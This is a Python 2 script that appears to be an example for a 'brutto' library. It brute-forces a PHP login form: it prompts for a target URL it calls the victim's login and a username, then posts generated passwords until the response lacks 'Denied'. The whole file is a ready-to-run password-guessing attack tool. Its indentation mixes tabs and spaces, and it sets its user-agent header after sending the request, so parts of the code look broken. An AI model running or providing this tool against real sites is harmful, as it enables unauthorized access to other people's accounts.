#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2014 @jofpin  <jofpin@gmail.com>
#
###################
import os         #
import re         #
import sys        #
import urllib     #
import urllib2    #####################
from brutto_easy import Brutto        #
#######################################
#
# Brutting - Example with login (php)
#
#############################################################
# You can modify these values, depending on the input data  #
#############################################################
#                                                           #
inputUser = "username"                                      #
inputPass = "password"                                      #
#                                                           #
# Data form by default (example)                            #
# <input type="text" name="username">                       #
# <input type="password" name="password">                   #
#############################################################

# Clear console
if "linux" in sys.platform:
    os.system("clear")
elif "win" in sys.platform:
    os.system("cls")
else:
    pass

# Colors 
color = {"blue": "\033[94m", "green": "\033[92m", "white": "\033[0m", "red": "\033[91m", "yellow": "\033[93m"}


def main():

    print "\t\t---------------" + color['green'] + "login" + color['white'] + "--------------"
    print "\t\tx      Developed by " + color['blue'] + "@jofpin" +  color['white'] + "      x"
    print "\t\tx      Example of brutto.py      x"
    print "\t\t----------------------------------\n\n"

    # URL of the login of the victim
    host = raw_input("Insert Target -> ")

    # Username of login
    username = raw_input("Username: ")

    # total value of password or total of characters example: 5
    valuePass = input("Value password: ")

    # brutto relation
    bruteforce = Brutto()
    # config
    for password in bruteforce.increase(scope=valuePass, letters=True, numbers=False, symbols=False):

    # Here I get the form data
	formData = [(inputUser, username), (inputPass, password)]

	# Runner process tan tan
	print color['white'] + "> " + color['blue'] + "Brutting: " + color['green'], password + color['white']

	login = urllib.urlencode(formData)

	opener = urllib2.build_opener()

	core = opener.open(host, login).read()

	opener.addheaders = [(
    	"User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:32.0) Gecko/20100101 Firefox/32.0"
    	)]


	if re.search("Denied", core) == None:
		print "\n[" + color['green'] + "+" + color['white'] + "]" + color['blue'] + " Successful Brutting!\n"
		print color['white'] + "[" + color['blue'] + "+" + color['white'] + "]" + color['yellow'] + " Username:" + color['white'], username
		print color['white'] + "[" + color['blue'] + "+" + color['white'] + "]" + color['yellow'] + " Password:" + color['white'], password
		break

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
        	sys.exit(color['white'] + "\n\n[-] " + color['yellow'] + "status: " + color['red'] + "CLOSE\n" + color['white']) #Ctrl + c = close
                pass
        except Exception as error:
        	sys.exit(color['red'] + "Error: " + color['blue'] + "%s" % error + color['white']) # Result of error
